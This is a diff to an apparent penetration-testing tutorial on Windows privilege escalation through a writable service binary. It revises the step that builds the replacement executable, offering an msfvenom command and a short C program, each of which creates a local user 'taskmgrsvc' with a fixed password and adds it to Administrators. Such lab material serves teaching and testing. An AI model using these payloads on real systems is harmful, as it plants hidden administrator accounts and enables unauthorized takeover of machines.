@@ -34,18 +34,39 @@ In this example, the binary `C:\backups\backupsvc.exe` has **BUILTIN\Users:(F)**
 ### Exploitation Stage
 
 #### Step 2: Generate a Malicious Executable
-On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:
+-
+  ### Option 1: Using msfvenom
+  -
+    On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:
 
-```bash
-msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o adduser.exe
-```
+    ```bash
+    msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o adduser.exe
+    ```
+    - **Payload**: `windows/exec` runs arbitrary commands.
+    - **Commands**: 
+      - `net user taskmgrsvc Password123! /add`: Creates a new user `taskmgrsvc`.
+      - `net localgroup administrators taskmgrsvc /add`: Adds `taskmgrsvc` to the Administrators group.
+    - **Output**: The malicious binary is saved as `adduser.exe`.
+-
+  ### Option 2. Compile with the following C program:
 
-- **Payload**: `windows/exec` runs arbitrary commands.
-- **Commands**: 
-   - `net user taskmgrsvc Password123! /add`: Creates a new user `taskmgrsvc`.
-   - `net localgroup administrators hackeruser /add`: Adds `hackeruser` to the Administrators group.
-- **Output**: The malicious binary is saved as `adduser.exe`.
+  -
+    ```c
+    #include <stdlib.h>
 
+    int main ()
+    {
+      int i;
+
+      i = system ("net user taskmgrsvc Password123! /add");
+      i = system ("net localgroup administrators taskmgrsvc /add");
+
+      return 0;
+    }
+    ```   
+    ```bash
+    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+    ```
 ---
 
 #### Step 3: Transfer the Malicious Binary to the Target Machine
